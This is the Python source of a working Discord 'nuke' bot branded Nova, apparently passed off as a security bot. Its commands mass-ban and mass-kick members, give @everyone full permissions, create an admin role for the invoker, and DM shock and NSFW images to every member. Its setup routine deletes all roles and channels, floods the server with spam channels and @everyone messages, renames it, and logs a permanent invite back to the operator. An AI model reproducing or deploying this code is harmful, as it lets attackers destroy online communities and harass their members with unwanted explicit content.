import discord
from discord.ext import commands
from discord.ui import View, Select, Button
import asyncio
import random
import aiohttp
from datetime import datetime

BOT_TOKEN = ""
LOG_CHANNEL_ID = ""
WHITELIST_SERVER_IDS = [1318760257048023040, 1345666639106019380]

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.guild_messages = True
intents.guild_message_reactions = True
intents.guild_message_typing = True
intents.webhooks = True
intents.presences = True
intents.typing = True
intents.dm_messages = True
intents.dm_reactions = True
intents.dm_typing = True
intents.reactions = True
intents.messages = True
intents.bans = True
intents.invites = True

bot = commands.Bot(command_prefix="n!", intents=intents)
bot.remove_command("help")

class Help(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def help(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()

        main_embed = discord.Embed(
            title="<a:Black_cross:1353971971095793776> ⛧**__Commands__** ⛧ <a:Black_cross:1353971971095793776>",
            description="**Choose a category... but beware of what you seek.**",
            color=0x2F2F2F
        )
        main_embed.set_thumbnail(url="https://i.pinimg.com/736x/6c/3c/88/6c3c885c40e7d4b12b597fdf55c61951.jpg")
        main_embed.set_image(url="https://i.pinimg.com/originals/56/e5/97/56e597a70e4651eb9c91ef7b77c1b224.gif")
        main_embed.add_field(name="<:icons_settings:1099577554991583292> Free Commands", value="Commands available for mortals.\n<:green_right_arrow:1158389497730433174> Select a category to see details.", inline=False)
        main_embed.add_field(name="<:lgn_lock:1099575627679547473> Premium Commands", value="Forbidden knowledge... for the chosen ones.\n<:green_right_arrow:1158389497730433174> Select a category to see details.", inline=False)

        view = View()
        select = Select(
            placeholder="Choose your fate...",
            options=[
                discord.SelectOption(label="Free Commands", description="Commands for mere mortals."),
                discord.SelectOption(label="Premium Commands", description="Exclusive knowledge for VIPs."),
            ],
            custom_id="command_category"
        )

        async def select_callback(interaction):
            selected = select.values[0]
            new_embed = discord.Embed(
                title=f"{selected}",
                description="**You have chosen... there is no turning back.**",
                color=0x2F2F2F
            )

            if "Free" in selected:
                commands_list = {
                    "`💣` `n!setup`": "Set up the bot(nuke) [300s cooldown].",
                    "`💣` `n!webhooks`": "Get all webhooks in the server [100s cooldown].",
                    "`💣` `n!massban`": "Ban all members (up to 100) [100s cooldown].",
                    "`💣` `n!masskick`": "Kick all members (up to 100) [100s cooldown].",
                    "`💣` `n!perm`": "Grant full permissions to @everyone [100s cooldown].",
                    "`💣` `n!admin`": "Create and assign Admin role [100s cooldown].",
                    "`💣` `n!role`": "Spam create new roles [100s cooldown].",
                    "`💣` `n!dmnsfw`": "Send chaotic NSFW spam to all members [100s cooldown].",
                    "`💣` `n!ping`": "Check the bot's latency [5s cooldown].",
                }
                for cmd, desc in commands_list.items():
                    new_embed.add_field(name=cmd, value=desc, inline=False)
            else:
                new_embed.add_field(name="Premium Commands", value="Coming soon...", inline=False)

            new_embed.set_thumbnail(url="https://i.pinimg.com/736x/b0/69/ba/b069ba05ac1dc5f1a81d1fc160e28db7.jpg")

            back_button = Button(label="Back", style=discord.ButtonStyle.secondary)

            async def back_callback(interaction):
                await interaction.response.edit_message(embed=main_embed, view=view)

            back_button.callback = back_callback
            new_view = View()
            new_view.add_item(select)
            new_view.add_item(back_button)
            await interaction.response.edit_message(embed=new_embed, view=new_view)

        select.callback = select_callback
        view.add_item(select)

        support_button = Button(label="Support", style=discord.ButtonStyle.link, url="https://discord.gg/jNVFMMQwcs")
        invite_button = Button(label="Invite", style=discord.ButtonStyle.link, url="https://discord.com/oauth2/authorize?client_id=1345294758720962631")
        view.add_item(support_button)
        view.add_item(invite_button)

        await ctx.send(embed=main_embed, view=view)

    @commands.command()
    @commands.cooldown(1, 5, commands.BucketType.user)
    async def ping(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()
        latency = round(bot.latency * 1000)
        embed = discord.Embed(
            title="**__PING__**",
            description="```css\n> Connection Status: Live\n> Latency Detected: {latency}ms\n```".format(latency=latency),
            color=0x00FFFF,  
            timestamp=datetime.utcnow()
        )
        embed.set_thumbnail(url="https://i.pinimg.com/736x/f5/c1/d3/f5c1d31978d2c8b5e3fa8f12e6e47ee1.jpg")  
        embed.add_field(name="Status", value="**ONLINE**", inline=True)
        embed.add_field(name="Response", value=f"**{latency}ms**", inline=True)
        embed.set_footer(text=f"Requested by {ctx.author.name} | Nova Power", icon_url="https://i.imgur.com/5yT2kX8.png")  
        await ctx.send(embed=embed, delete_after=5)

    @help.error
    @ping.error
    async def command_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"<:cooldown:1354679283733368964> Wait {error.retry_after:.1f} seconds to reuse this command.", delete_after=5)

class MassBan(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def massban(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()

        for member in ctx.guild.members:
            if member.id != self.bot.user.id:
                try:
                    await member.ban(reason="Massban by Nova")
                    await asyncio.sleep(0.5)
                except discord.Forbidden:
                    break
                except Exception as e:
                    print(f"Failed to ban {member}: {e}")

    @massban.error
    async def massban_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"<:cooldown:1354679283733368964> Wait {error.retry_after:.1f} seconds to reuse this command.", delete_after=5)

class MassKick(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def masskick(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()

        for member in ctx.guild.members:
            if member.id != self.bot.user.id:
                try:
                    await member.kick(reason="Masskick by Nova")
                    await asyncio.sleep(0.5)
                except discord.Forbidden:
                    break
                except Exception as e:
                    print(f"Failed to kick {member}: {e}")

    @masskick.error
    async def masskick_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"<:cooldown:1354679283733368964> Wait {error.retry_after:.1f} seconds to reuse this command.", delete_after=5)

class Webhooks(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def webhooks(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()

        webhooks_info = []
        for channel in ctx.guild.text_channels:
            try:
                webhooks = await channel.webhooks()
                for webhook in webhooks:
                    webhooks_info.append(f"- **{webhook.name}**: {webhook.url}")
            except discord.Forbidden:
                continue

        if webhooks_info:
            embed = discord.Embed(
                title="Webhooks",
                description="List of webhooks in this server:\n" + "\n".join(webhooks_info[:10]),
                color=0x2F2F2F
            )
            if len(webhooks_info) > 10:
                embed.set_footer(text=f"{len(webhooks_info) - 10} more webhooks not shown.")
            try:
                await ctx.author.send(embed=embed)
            except discord.Forbidden:
                pass

    @webhooks.error
    async def webhooks_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"<:cooldown:1354679283733368964> Wait {error.retry_after:.1f} seconds to reuse this command.", delete_after=5)

class Perm(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def perm(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()

        try:
            everyone_role = ctx.guild.default_role
            await everyone_role.edit(permissions=discord.Permissions.all())
        except discord.Forbidden:
            pass
        except discord.HTTPException as e:
            print(f"Failed to update permissions: {e}")

    @perm.error
    async def perm_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"<:cooldown:1354679283733368964> Wait {error.retry_after:.1f} seconds to reuse this command.", delete_after=5)

class Admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def admin(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()

        if not ctx.guild.me.guild_permissions.manage_roles:
            return

        try:
            admin_role = await ctx.guild.create_role(
                name="Admin",
                color=discord.Color.blurple(),
                permissions=discord.Permissions.all()
            )
            members = [ctx.guild.me, ctx.author]
            for member in members:
                await member.add_roles(admin_role)
        except discord.Forbidden:
            pass
        except discord.HTTPException as e:
            print(f"Failed to create admin role: {e}")

    @admin.error
    async def admin_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"<:cooldown:1354679283733368964> Wait {error.retry_after:.1f} seconds to reuse this command.", delete_after=5)

class DMNSFW(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def dmnsfw(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()

        embeds = [
            discord.Embed(
                title="🔥 WELCOME TO HELL 🔥",
                description="💀💥💦 YOU CAN’T ESCAPE THIS NIGHTMARE! 💦💥💀",
                color=0xFF0000
            ).set_image(url="https://media.discordapp.net/attachments/1204135293935161374/1242647756498272297/descarga.gif?ex=67e5f8e8&is=67e4a768&hm=0c823450328094bd3684c2b24053593a9b883aa388f25f24dd501a837442920a&=").set_thumbnail(url="https://i.imgur.com/QrZ9X7k.png"),
            discord.Embed(
                title="💣 CHAOS UNLEASHED 💣",
                description="👹💨 SCREAM LOUDER, NO ONE HEARS YOU! 💨👹",
                color=0xFF4500
            ).set_image(url="https://media.discordapp.net/attachments/1243681859741945871/1295175782271811634/ezgif-2-f93c92e2a8.gif?ex=67e5e7f1&is=67e49671&hm=0d686b7e39bf7f0f7b970f79b36ad91ac2443108a9ee2cc8fe5850f4088049da&=").add_field(name="DIE", value="🔪🔪🔪🔪🔪🔪🔪🔪🔪🔪"),
            discord.Embed(
                title="🩸 BLOOD AND MADNESS 🩸",
                description="💩🧠 YOUR MIND IS MINE NOW! 🧠💩",
                color=0x8B0000
            ).set_image(url="https://media.discordapp.net/attachments/1243681859741945871/1253719453087039498/huge_anime-5855.gif?ex=67e60a7a&is=67e4b8fa&hm=2c79969a83fb6fff0fc8cffcde738ad89da0dd9ff1b77af2db4911dbf0ac862d&=").set_footer(text="RUN IF YOU CAN!"),
            discord.Embed(
                title="👁️‍🗨️ STARE INTO THE VOID 👁️‍🗨️",
                description="🤡💦 IT’S TOO LATE TO TURN BACK! 💦🤡",
                color=0x4B0082
            ).set_image(url="https://media.discordapp.net/attachments/1243681859741945871/1255094598540202054/IMG_8026.gif?ex=67e5c52e&is=67e473ae&hm=443d5803c3745e22e3fc9c3fd4b3e74236217a7b4dcbb2ebdddd7cc2b13d8d6e&=").add_field(name="FEAR", value="👻👻👻👻👻👻👻👻👻👻"),
            discord.Embed(
                title="💀 FINAL CURSE 💀",
                description="🕸️🔥 YOUR SOUL IS TRAPPED FOREVER! 🔥🕸️",
                color=0x000000
            ).set_image(url="https://media.discordapp.net/attachments/1342864771246063720/1342879792214704168/54_1_1_a8f2015271be676a0f8684c77b32cc45.jpg.cace0e73-558c-47b0-916e-9b3b23f268d1.jpeg?ex=67e61683&is=67e4c503&hm=77595da5289a537c2b2aa062b93dea6aed4fa0cfb3379dc8912272145f8aadb7&=&format=webp&width=670&height=948").set_thumbnail(url="https://media.discordapp.net/attachments/1342864771246063720/1342879792214704168/54_1_1_a8f2015271be676a0f8684c77b32cc45.jpg.cace0e73-558c-47b0-916e-9b3b23f268d1.jpeg?ex=67e61683&is=67e4c503&hm=77595da5289a537c2b2aa062b93dea6aed4fa0cfb3379dc8912272145f8aadb7&=&format=webp&width=670&height=948")
        ]

        for member in ctx.guild.members:
            if not member.bot and member != ctx.author:
                try:
                    for embed in embeds:
                        await member.send(embed=embed)
                        await asyncio.sleep(0.5)
                except discord.Forbidden:
                    continue
                except discord.HTTPException as e:
                    print(f"Failed to DM {member}: {e}")

    @dmnsfw.error
    async def dmnsfw_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"<:cooldown:1354679283733368964> Wait {error.retry_after:.1f} seconds to reuse this command.", delete_after=5)

class Role(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def role(self, ctx):
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return

        await ctx.message.delete()

        for _ in range(250):
            try:
                random_color = discord.Colour(random.randint(0, 0xFFFFFF))
                await ctx.guild.create_role(name="N̷u̷k̷e̷d̷-̷B̷y̷-̷N̷o̷v̷a̷W̷o̷r̷l̷d̷", colour=random_color)
                await asyncio.sleep(0.2)
            except discord.Forbidden:
                break
            except discord.HTTPException:
                continue

    @role.error
    async def role_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"<:cooldown:1354679283733368964> Wait {error.retry_after:.1f} seconds to reuse this command.", delete_after=5)

class NukeV2:
    def __init__(self):
        self.rate_limit_delay = 1.0
        self.message_delay = 1.0
        self.max_messages = 5
        self.proxy_list = []
        self.proxy_index = 0
        self.failed_attempts = 0
        self.last_nuke_time = 0
        self.concurrent_tasks = 35
        self.proxy_api = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=max&country=all&ssl=all&anonymity=all"
        self.channel_names = sum([["Nuked-By-Nova"] * 35, ["Nova-Destroyed"] * 35, ["Chaos-By-Nova"] * 35, ["Nova-Ruined"] * 35, ["Endgame-Nova"] * 35], [])
        random.shuffle(self.channel_names)

    async def _get_proxy_list(self):
        async with aiohttp.ClientSession() as session:
            for attempt in range(3):
                try:
                    async with session.get(self.proxy_api) as response:
                        if response.status == 200:
                            self.proxy_list = [p.strip() for p in (await response.text()).splitlines() if p.strip()]
                            return
                except Exception:
                    await asyncio.sleep(2 ** attempt)

    def _get_next_proxy(self):
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1
        return proxy

    async def _create_session(self):
        proxy = self._get_next_proxy()
        return aiohttp.ClientSession(proxy=f"http://{proxy}") if proxy else aiohttp.ClientSession()

    async def _log(self, content=None, embed=None):
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            try:
                await log_channel.send(content=content, embed=embed)
            except Exception as e:
                print(f"Failed to log: {e}")

    async def _log_server_info(self, message, invite_link):
        guild = message.guild
        embed = discord.Embed(
            title="Nova Nuke Initiated",
            color=0x2F3136,
            timestamp=datetime.utcnow()
        )
        embed.add_field(name="Server", value=f"{guild.name} (ID: {guild.id})", inline=False)
        embed.add_field(name="Owner", value=str(guild.owner or "Unknown"), inline=True)
        embed.add_field(name="Members", value=str(guild.member_count), inline=True)
        embed.add_field(name="Channels", value=str(len(guild.channels)), inline=True)
        embed.add_field(name="Roles", value=str(len(guild.roles)), inline=True)
        embed.add_field(name="Created On", value=guild.created_at.strftime("%d/%m/%Y %H:%M:%S"), inline=False)
        embed.add_field(name="Executed By", value=f"{message.author} (ID: {message.author.id})", inline=False)
        embed.set_footer(text=f"Time: {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')}")
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        await self._log(content=f"**Permanent Invite Link:** {invite_link}", embed=embed)

    async def delete_or_rename_channel(self, channel, deleted_channels):
        if channel.id in deleted_channels:
            return None
        try:
            await channel.delete()
            deleted_channels.add(channel.id)
            return f"Deleted channel: {channel.name} (ID: {channel.id})"
        except (discord.Forbidden, discord.HTTPException):
            deleted_channels.add(channel.id)
            return None

    async def create_channel(self, guild, name, retries=3):
        for attempt in range(retries):
            try:
                channel = await guild.create_text_channel(name)
                return channel, f"Created channel: {name} (ID: {channel.id})"
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(e.response.headers.get("Retry-After", 1)))
                else:
                    await self._log(content=f"**[Server: {guild.name} | ID: {guild.id}]** Failed to create channel {name}: {e}")
                    return None, f"Failed to create channel {name}: {e}"
            except Exception as e:
                await self._log(content=f"**[Server: {guild.name} | ID: {guild.id}]** Error creating channel {name}: {e}")
                return None, f"Error creating channel {name}: {e}"
        return None, f"Failed to create channel {name} after {retries} retries"

    async def delete_roles(self, guild, message):
        for role in guild.roles:
            if role.position < guild.me.top_role.position and not role.is_default():
                try:
                    await role.delete()
                    await self._log(content=f"**[Server: {guild.name} | ID: {guild.id}]** Deleted role: {role.name} (ID: {role.id})")
                except (discord.Forbidden, discord.HTTPException):
                    await self._log(content=f"**[Server: {guild.name} | ID: {guild.id}]** Failed to delete role: {role.name} (ID: {role.id})")

    async def rate_limited(self, retry_after=0.1, is_message=False):
        delay = self.message_delay if is_message else self.rate_limit_delay
        await asyncio.sleep(max(delay, retry_after))

    async def spam_message(self, channel, message, times=5, image_url=None, gif_url=None):
        main_embed = discord.Embed(
            title="Do you really think this is a security bot?",
            description="**This server has been nuked by Nova.**\nJoin: [Nova](https://discord.com/invite/wJdNhde4WV) \nYoutube: [Check](https://www.youtube.com/channel/) \nInstagram: [Check](https://www.instagram.com/nova_world_official/)",
            color=0x2F3136,
            timestamp=datetime.utcnow()
        )
        main_embed.set_footer(text="NUKE BY NOVA")
        if gif_url:
            main_embed.set_thumbnail(url=gif_url)
        if image_url:
            main_embed.set_image(url=image_url)

        for _ in range(min(times, self.max_messages)):
            try:
                await channel.send(content=message, embed=main_embed)
                await self.rate_limited(is_message=True)
            except discord.HTTPException as e:
                if e.status == 429:
                    await self.rate_limited(float(e.response.headers.get("Retry-After", 0.2)), is_message=True)
                else:
                    await self._log(content=f"**[Server: {channel.guild.name} | ID: {channel.guild.id}]** Failed to send message in {channel.name}: {e}")
                    break

    async def _execute_nuke(self, message):
        current_time = asyncio.get_event_loop().time()
        if current_time - self.last_nuke_time < 120:
            await self._log(content=f"**[Server: {message.guild.name} | ID: {message.guild.id}]** Nuke on cooldown. Please wait.")
            return
        self.last_nuke_time = current_time

        if not self.proxy_list:
            await self._get_proxy_list()

        spam_message_content = "# <a:Black_cross:1353971971095793776> **__SERVER DESTROYED BY NOVA__** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/jNVFMMQwcs"
        image_url = "https://i.pinimg.com/originals/df/1b/55/df1b5570637dfa5dea04929d5a787a1e.gif"

        await self._log(content=f"**[Server: {message.guild.name} | ID: {message.guild.id}]** Starting role deletion...")
        await self.delete_roles(message.guild, message)

        await self._log(content=f"**[Server: {message.guild.name} | ID: {message.guild.id}]** Starting channel deletion...")
        deleted_channels = set()
        delete_tasks = [self.delete_or_rename_channel(channel, deleted_channels) for channel in message.guild.channels]
        await self._process_tasks(delete_tasks, "deletion")

        await self._log(content=f"**[Server: {message.guild.name} | ID: {message.guild.id}]** Starting channel creation...")
        create_tasks = [self.create_channel(message.guild, name) for name in self.channel_names]
        new_channels, _ = await self._process_create_tasks(create_tasks)

        await self._log(content=f"**[Server: {message.guild.name} | ID: {message.guild.id}]** Renaming server...")
        await self._rename_server(message.guild)

        await self._log(content=f"**[Server: {message.guild.name} | ID: {message.guild.id}]** Spamming default channel...")
        default_channel = message.guild.system_channel or (message.guild.text_channels[0] if message.guild.text_channels else None)
        if default_channel:
            await self._spam_default_channel(default_channel, spam_message_content, image_url)

        await self._log(content=f"**[Server: {message.guild.name} | ID: {message.guild.id}]** Spamming new channels...")
        spam_tasks = [self.spam_message(channel, spam_message_content, image_url=image_url) for channel in new_channels if channel]
        await self._process_tasks(spam_tasks, "spam")

        await self._log(content=f"**[Server: {message.guild.name} | ID: {message.guild.id}]** Nuke completed successfully.")

    async def _process_tasks(self, tasks, task_type):
        for i in range(0, len(tasks), self.concurrent_tasks):
            try:
                await asyncio.gather(*tasks[i:i + self.concurrent_tasks], return_exceptions=True)
            except Exception as e:
                await self._log(content=f"**[Task: {task_type}]** Error in batch: {e}")

    async def _process_create_tasks(self, tasks):
        new_channels = []
        for i in range(0, len(tasks), self.concurrent_tasks):
            try:
                batch_results = await asyncio.gather(*tasks[i:i + self.concurrent_tasks], return_exceptions=True)
                for channel, _ in batch_results:
                    if channel and isinstance(channel, discord.TextChannel):
                        new_channels.append(channel)
            except Exception as e:
                await self._log(content=f"**[Task: create_channel]** Error in batch: {e}")
        return new_channels, []

    async def _spam_default_channel(self, channel, message, image_url):
        try:
            await self.spam_message(channel, message, times=5, image_url=image_url)
        except (discord.Forbidden, discord.HTTPException) as e:
            await self._log(content=f"**[Server: {channel.guild.name} | ID: {channel.guild.id}]** Failed to spam default channel: {e}")

    async def _rename_server(self, guild):
        try:
            await guild.edit(name="𝐒𝐄𝐑𝐕𝐄𝐑 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐃 𝐁𝐘 𝐍𝐎𝐕𝐀")
        except (discord.Forbidden, Exception) as e:
            await self._log(content=f"**[Server: {guild.name} | ID: {guild.id}]** Failed to rename server: {e}")

    @commands.cooldown(1, 300, commands.BucketType.user)
    async def setup(self, message):
        if message.guild.id in WHITELIST_SERVER_IDS:
            return
        await self._delete_command_message(message)
        invite_link = await self._create_invite(message)
        await self._log_server_info(message, invite_link)
        await self._execute_nuke(message)

    async def _delete_command_message(self, message):
        try:
            await message.delete()
        except discord.NotFound:
            pass

    async def _create_invite(self, message):
        try:
            invite = await message.channel.create_invite(max_age=0, max_uses=0)
            return invite.url
        except (discord.Forbidden, discord.HTTPException):
            return "Unable to create invite link."

nuke = NukeV2()

async def setup(bot):
    await bot.add_cog(Help(bot))
    await bot.add_cog(MassBan(bot))
    await bot.add_cog(MassKick(bot))
    await bot.add_cog(Webhooks(bot))
    await bot.add_cog(Perm(bot))
    await bot.add_cog(Admin(bot))
    await bot.add_cog(DMNSFW(bot))
    await bot.add_cog(Role(bot))

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    await setup(bot)
    server_count = len(bot.guilds)
    user_count = sum(guild.member_count for guild in bot.guilds)
    activity = discord.Streaming(
        name=f"n!help | {server_count} Servers | {user_count} Users",
        url="https://twitch.tv/nova"
    )
    await bot.change_presence(activity=activity)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content.startswith("n!setup"):
        if message.guild.id in WHITELIST_SERVER_IDS:
            await message.channel.send("This server is whitelisted.", delete_after=5)
            return
        try:
            await nuke.setup(message)
        except commands.CommandOnCooldown as e:
            await message.channel.send(f"<:cooldown:1354679283733368964> Wait {e.retry_after:.1f} seconds to reuse this command.", delete_after=5)

    await bot.process_commands(message)

bot.run(BOT_TOKEN)
